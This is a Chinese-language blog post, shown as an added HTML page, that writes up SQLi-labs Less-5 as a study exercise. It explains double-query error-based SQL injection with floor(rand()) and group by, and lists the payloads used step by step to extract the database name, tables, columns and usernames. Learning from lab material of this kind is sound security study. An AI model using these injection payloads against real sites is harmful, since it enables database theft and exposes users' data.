@@ -1,0 +1,351 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>sql注入练习5 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-02-02">2021-02-02</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">sql注入练习5</h2>
+            <div class="post-meta">
+                emm... 4185 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>今天学习一个新的sql注入方式——双查询注入。  </p>
+<h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><h2 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h2><p>先说明原理：  </p>
+<blockquote>
+<p>原理：简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p>
+</blockquote>
+<p>接着介绍一下这个查询方式要用到的函数：  </p>
+<blockquote>
+<p>rand()是一个生成随机数的函数，他会返回0到1之间到一个值。<br>floor()是取整函数了，会返回小于等于你输入的数的整数。<br>count()是一个聚合函数，用户返回符合条件的记录数量。  </p>
+</blockquote>
+<p>那么这三个函数结合到一起会发生什么呢？<br>下面介绍一下双查询注入的格式：  </p>
+<blockquote>
+<p>select count(*),concat_ ws(‘:’,([子查询],floor(rand() *  2))) as a form [table_name] group by a;&lt;&gt;</p>
+</blockquote>
+<p>我们来一点一点的理解这个语句。先看floor(rand() *2))这个叠加函数。 首先这个 rand() *2使最后返回的数大小在0-2之间（因为rand（）函数返回的值在0-1之间，乘2后就在0-2之间了），随后返回的数又经过floor()取整函数，那么最终得到的数要么是0，要么是1。<br>接下来我们扩展这个语句：  </p>
+<blockquote>
+<p>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2));</p>
+</blockquote>
+<p>可以看到我们使用concat将SELECT database()和FLOOR(RAND()*2这两个语句连接起来，concat语句会将两个返回的值连接到一块。比如SELECT concat(‘string1’,’string2’);显示的结果就是string1string2。<br>那么我们可以推断出，这样的语句返回的结果不是security0就是security1了。  </p>
+<p>如果我们把这条语句后面加上from 一个表名。那么一般会返回security0或security1的一个集合。数目是由表本身有几条结果决定的。比如一个管理表里有5个管理员。这个就会返回五条记录，users表里有13个用户，所以返回13条。<br>如果是从information_schema.schemata里，这个表里包含了mysql的所有数据库名。所以当我们from information _ schema.schemata时，它便返回（当前使用的数据库名字+0或1）一共有几个数据库便返回几条结果。  </p>
+<p>但是想要报错count和group by语句是不能少的，接下来我们先用分组语句group by将我们得到的很多条结果（security0和security1）进行分组。  </p>
+<blockquote>
+<p>select concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;</p>
+</blockquote>
+<p>我们给这些结果新建了一个表，通过<strong>as a</strong>起名为a，在这个表里security0的分到一组，security1的分到另一组，那么这时候我们的这个名为a的表里只剩下两个结果了：security0和security1.   </p>
+<p>最后我们便插入聚合函数count(* )，这个函数返回包括所有列，返回表中的记录数，相当于统计表的行数。但是如果我们在这里使用，就会发生报错。（原因是floor( random(0) *2 )的不确定性）  </p>
+<hr>
+<h3 id="报错具体原因"><a href="#报错具体原因" class="headerlink" title="报错具体原因"></a>报错具体原因</h3><p>group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0) * 2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0) * 2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p>
+<p>结论是：当与临时表里面的值进行比较，如果不同，就插入，但是插入的时候又计算了一次，所以如果插入时计算的值与直接比较的值不一样，则报错！</p>
+<hr>
+<p>这个报错是很致命的，它会直接将我们所要查的数据库名字，字段的信息给报出来，这也就达到了我们注入的目的。  </p>
+<h2 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h2><p>可以看到无论我们怎么输入，页面都只会显示两种界面<br>报错界面<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/yMoebQ"><img src="https://s3.ax1x.com/2021/02/03/yMoebQ.md.png" alt="yMoebQ.md.png"></a><br>you are in…界面<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/yMol80"><img src="https://s3.ax1x.com/2021/02/03/yMol80.md.png" alt="yMol80.md.png"></a><br>所以这道题我们选择报错注入——双查询注入。<br>构造以下payload：  </p>
+<blockquote>
+<p>?id=1’ and (select count(* ),concat((select database()),floor(rand(0)*2))as a from information_schema.tables group by a)–+</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/yMoa5R"><img src="https://s3.ax1x.com/2021/02/03/yMoa5R.md.png" alt="yMoa5R.md.png"></a><br>却发现它说只能查一个字段（因为我们原本查询的是所有的结果，而现在只允许查一个字段），这里就要用到派生表的知识。  </p>
+<blockquote>
+<p>派生表是一个查询结果生成的表，类似于临时表。<br>派生表可以简化查询，避免使用临时表。相比手动生成临时性能更优越。派生表与其他表一样出现在查询的FROM子句中<br>select * from (select * from athors)  temp<br>temp 就是派生表</p>
+</blockquote>
+<p>所以我们构建一个这样的派生表，将我们的所有结果放到这个表里，然后查询一个字段。  </p>
+<blockquote>
+<p>?id=1’ and (select 1 from(select count(* ),concat((select database()),floor(rand(0)*2))as a from information_schema.tables group by a))–+</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/yMo7qg"><img src="https://s3.ax1x.com/2021/02/03/yMo7qg.md.png" alt="yMo7qg.md.png"></a><br>发现又有新的要求：每个派生出来的表都必须有一个自己的别名，所以我们再给这个派生表起一个别名。  </p>
+<blockquote>
+<p>?id=1’ and (select 1 from(select count(* ),concat((select database()),floor(rand(0)*2))as a from information_schema.tables group by a)x)–+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/03/y12MCKTYIic6nEv.png" alt="8.png"><br>可以看到成功报错了，同时爆出来了当前使用的数据库，注意security1后面的1不是数据库名字中的，它是报错后加上的，并不在原本的数据库名字中。<br>接下来的操作就和以前的sql注入一样了。<br>查表名  </p>
+<blockquote>
+<p>?id=1’ and (select 1 from(select count( * ),concat((select group _concat(table _ name) from information _ schema.tables where table _  schema=’security’),floor(rand(0) *2))as a from information_schema.tables group by a)x)–+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/03/zZB4sNVOSGfryPe.png" alt="9.png"><br>爆字段  </p>
+<blockquote>
+<p>?id=1’ and (select 1 from(select count(* ),concat((select group_ concat(column_name) from information _ schema.columns where table _name=’users’),floor(rand(0) *2))as a from information_schema.tables group by a)x)–+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/03/ufLzkrc6saRJQ7x.png" alt="10.png"><br>但是等到我吗查询字段时又发生了问题。</p>
+<blockquote>
+<p>?id=1’ and (select 1 from(select count( * ),concat((select group_ concat(username) from security.users ),floor(rand(0) *2))as a from information_schema.tables group by a)x)–+</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/yMTFo9"><img src="https://s3.ax1x.com/2021/02/03/yMTFo9.md.png" alt="yMTFo9.md.png"></a><br>显示返回的字符超过了1行，导致返回报错，说明group_ concat在这里已经超出了它的长度限度，那么我们使用limit 0,1来一个一个的输出。  </p>
+<blockquote>
+<p>group_concat()函数的作用：将返回信息拼接成一行显示最多显示64个字符<br>limit 0,1  表示输出第一个数据。   0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个)</p>
+</blockquote>
+<p>这样构造payload。  </p>
+<blockquote>
+<p>?id=1’ and (select 1 from(select count( * ),concat((select username from security.users limit 0,1),floor(rand(0) *2))as a from information_schema.tables group by a)x)–+</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/yMTmQK"><img src="https://s3.ax1x.com/2021/02/03/yMTmQK.md.png" alt="yMTmQK.md.png"></a><br>通过改变0，1，2，3…..来一个个读取数据。<br>至此，sql的双查询注入就结束了。</p>
+<hr>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>双查询注入是报错注入的一种方法，报错注入就是利用了sql的语句的报错来获得数据库的信息，除了双查询注入外还有别的报错注入的方法，比如通过updatexml报错，通过ExtractValue报错 ，双查询注入利用的是通过floor报错，这三种方法本质相同，都是利用函数的报错。之后会把另外的报错注入方法总结一下。<br>关于双查询注入，其实还是有一些地方需要继续探究的，下面附上相关博客和双查询注入的格式。  </p>
+<blockquote>
+<p>and (select 1 from (select count(* ),concat(( <strong>payload</strong>),floor (rand(0) *2))x from information_schema.tables group by x)a) </p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/BloodZero/p/4660971.html">双查询报错原因深究</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/lixiangminghate/article/details/80466257?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&spm=1001.2101.3001.4242">详细讲解双查询注入</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38196334/article/details/88644836?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161228375316780299083354%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161228375316780299083354&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-88644836.pc_search_result_cache&utm_term=count&spm=1018.2226.3001.4187">count（）函数的详解</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34987215/article/details/84145638?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161233565316780266270424%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161233565316780266270424&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-84145638.pc_search_result_cache&utm_term=sql%E6%B4%BE%E7%94%9F%E8%A1%A8&spm=1018.2226.3001.4187">SQL SERVER派生表</a></p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
